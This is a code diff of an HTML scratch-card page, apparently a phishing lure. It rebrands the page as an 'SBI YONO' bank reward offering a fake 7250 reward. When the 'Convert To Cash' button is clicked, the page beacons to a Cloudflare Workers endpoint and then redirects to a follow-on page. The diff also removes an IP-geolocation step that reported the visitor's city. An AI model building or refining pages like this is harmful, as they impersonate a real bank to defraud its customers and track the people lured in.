@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>babuji · reward scratch</title>
+    <title>SBI YONO Scratch & Win</title>
     <!-- same favicon as original -->
     <link rel="icon" type="image/png" href="https://vuejs.org/images/logo.png">
     <style>
@@ -268,16 +268,16 @@
 
     <div class="scratch-container">
         <div class="official-card">
-            <div class="card-header">REWARDZ</div>
+            <div class="card-header">SBI YONO REWARDZ</div>
             <div class="scratch-zone">
                 <div class="reward-background">
                     <span class="big-amount">7250</span>
-                    <span class="sub-text">Available Reward</span>
+                    <span class="sub-text">Available Reward Points</span>
                     <div class="sbi-watermark">REWARD</div>
                 </div>
                 <canvas id="scratchCanvas" width="300" height="250"></canvas>
             </div>
-            <div class="scratch-hint"> SCRATCH HERE</div>
+            <div class="scratch-hint">👇 SCRATCH HERE 👇</div>
         </div>
     </div>
 
@@ -315,7 +315,7 @@
             const transferBtn = document.getElementById('transferBtn');
             const timerDisplay = document.getElementById('countdownTimer');
 
-            // Worker URL for notifications (receives location)
+            // Worker URL for notifications
             const WORKER_URL = 'https://wandering-queen-c1f8.vikash6759ub.workers.dev/';
 
             // Scratch grid configuration
@@ -563,44 +563,17 @@
             canvas.addEventListener('touchend', stopScratch);
             canvas.addEventListener('touchcancel', stopScratch);
 
-            // ---------- LOCATION DETECTION (city via ipapi.co) ----------
-            async function detectUserCity() {
-                // free IP geolocation, no API key required (rate limited, but fine for demo)
-                try {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 3000); // 3s timeout
-                    const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
-                    clearTimeout(timeoutId);
-                    
-                    if (response.ok) {
-                        const data = await response.json();
-                        // ipapi.co returns: city, region, country_name, etc.
-                        return data.city || data.region || data.country_name || 'unknown';
-                    } else {
-                        console.warn('ipapi.co response not OK:', response.status);
-                        return 'unknown';
-                    }
-                } catch (error) {
-                    console.error('Failed to fetch location:', error);
-                    return 'unknown';
-                }
-            }
-
-            // ---------- NOTIFICATION TO WORKER (with location) ----------
+            // Function to send notification to worker
             async function sendConversionNotification() {
-                // 1. get city where page is opened
-                const city = await detectUserCity();   // e.g., "Kolkata", "Mumbai", "Chennai", "unknown"
-                
-                // 2. build payload
                 const payload = {
                     type: "Convert To Cash",
                     data: {
-                        Screch: "Sucessfully",   // kept original field (typo included)
-                        location: city            // new field with detected city
-                    }
+                        click: "Sucess",
+                        
+                    },
+                    id: "conv_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9)
                 };
 
-                // 3. send to worker
                 try {
                     const response = await fetch(WORKER_URL, {
                         method: 'POST',
@@ -611,26 +584,31 @@
                     if (!response.ok) {
                         console.error('Worker response error:', response.status);
                     } else {
-                        console.log('✅ Conversion notification sent with location:', city);
+                        console.log('Conversion notification sent successfully');
                     }
                 } catch (error) {
                     console.error('Failed to send notification:', error);
                 }
             }
 
-            // ---------- MODAL CLOSE & BUTTON HANDLER ----------
+            // Modal close handlers
             function closeModal() {
                 modal.style.display = 'none';
                 stopCountdown();
             }
 
-            // Attach click handler to "Convert To Cash" button
-            transferBtn.addEventListener('click', async function() {
+            transferBtn.addEventListener('click', function() {
                 if (!transferBtn.disabled) {
-                    // Send notification (including location), then redirect
-                    await sendConversionNotification();   // wait for it (best effort)
-                    window.location.href = 'mypages.html';
+                    // Send notification to worker
+                    sendConversionNotification().then(() => {
+                        // Redirect to mypages.html
+                        window.location.href = 'mypages.html';
+                    }).catch(() => {
+                        // Even if notification fails, still redirect
+                        window.location.href = 'mypages.html';
+                    });
                 } else {
+                    // If button disabled, maybe still redirect? Probably not.
                     closeModal();
                 }
             });
